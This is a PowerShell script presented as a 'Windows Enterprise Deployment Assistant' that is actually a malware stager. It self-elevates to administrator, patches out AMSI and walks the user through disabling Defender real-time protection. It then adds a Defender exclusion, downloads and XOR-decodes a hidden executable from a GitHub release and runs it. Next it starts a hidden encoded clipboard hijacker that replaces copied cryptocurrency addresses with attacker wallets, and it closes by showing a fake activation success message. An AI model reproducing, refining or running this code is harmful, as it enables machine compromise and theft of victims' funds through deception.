# --- [RESEARCH STAGER v46.0: VERIFIED SYNC SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Admin Gate (v34.0 Style)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,40); $console.Size = New-Object Drawing.Size(490,140)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING HOST... DONE`n > PRIVILEGES: ADMINISTRATOR`n > STATUS: [!] SERVICE CONFLICT"
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(480,45)
    $link.Text = "STEP 1: Open Security Panel"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,360); $check.Text = "STEP 2: I have turned OFF Real-time protection."; $check.Size = New-Object Drawing.Size(400,30)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,410); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Deploy Now"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-Deployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "System Deployment"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $status = New-Object Windows.Forms.Label
    $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(380,30); $status.Text = "Status: Connecting to secure server..."
    $form.Controls.Add($status)

    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,70); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb); $form.Show()

    try {
        # --- CORE ENGINE v34.0 ---
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        $path = Join-Path $dir "WinSvcHost.exe"
        
        # Step 1: Download
        $pb.Value = 25; $status.Text = "Status: Downloading Digital License..."
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)

        # Step 2: PRO WAIT FOR UAC
        $pb.Value = 50; $status.Text = "Status: Action Required! Click 'YES' on Windows prompt..."
        Start-Process $path -WindowStyle Hidden
        
        # This loop waits until the file is active or a timeout occurs, giving the user time to click 'Yes'
        $timer = 0
        while ((Get-Process "WinSvcHost" -ErrorAction SilentlyContinue).Count -eq 0 -and $timer -lt 60) {
            [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 500; $timer++
        }

        # Step 3: Finalize
        $pb.Value = 80; $status.Text = "Status: Finalizing Kernel Sync..."
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        $pb.Value = 100; $status.Text = "Status: Complete."
        Start-Sleep -m 800; $form.Close()
        [Windows.Forms.MessageBox]::Show("Windows Activated Successfully.", "Success", 0, 64) | Out-Null
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Deployment Failed: Service Conflict (Error: 0x80041010). Ensure Security is OFF and try again.", "Critical Error", 0, 16) | Out-Null
    }
}

# --- START ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) { Run-Deployment }
